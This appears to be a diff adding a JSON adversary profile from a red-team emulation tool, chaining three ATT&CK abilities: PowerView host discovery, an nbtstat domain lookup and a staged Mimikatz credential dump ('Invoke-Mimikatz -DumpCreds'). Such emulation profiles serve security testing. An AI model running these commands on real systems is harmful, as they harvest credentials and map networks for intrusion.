@@ -1,0 +1,39 @@
+{
+  "saved": true,
+  "adversary": {
+    "adversary_id": "temp-seed-fgdafj-1775113326",
+    "name": "Temp Seed Windows - Alice 2.0",
+    "description": "Auto-generated seed adversary from 50855e29-3b4e-4562-aa55-b3d7f93c26b8 for agent fgdafj",
+    "atomic_ordering": [
+      "13379ae1-d20e-4162-91f8-320d78a35e7f",
+      "14a21534-350f-4d83-9dd7-3c56b93a0c17",
+      "7049e3ec-b822-4fdf-a4ac-18190f9b66d1"
+    ]
+  },
+  "selected_abilities": [
+    {
+      "ability_id": "13379ae1-d20e-4162-91f8-320d78a35e7f",
+      "name": "Discover local hosts",
+      "tactic": "discovery",
+      "technique_id": "T1018",
+      "noisy_score": 3,
+      "command_preview": "Import-Module .\\powerview.ps1; Get-DomainComputer"
+    },
+    {
+      "ability_id": "14a21534-350f-4d83-9dd7-3c56b93a0c17",
+      "name": "Find Domain",
+      "tactic": "discovery",
+      "technique_id": "T1016",
+      "noisy_score": 3,
+      "command_preview": "nbtstat -n"
+    },
+    {
+      "ability_id": "7049e3ec-b822-4fdf-a4ac-18190f9b66d1",
+      "name": "Powerkatz (Staged)",
+      "tactic": "credential-access",
+      "technique_id": "T1003.001",
+      "noisy_score": 1,
+      "command_preview": "Import-Module .\\invoke-mimi.ps1; Invoke-Mimikatz -DumpCreds"
+    }
+  ]
+}
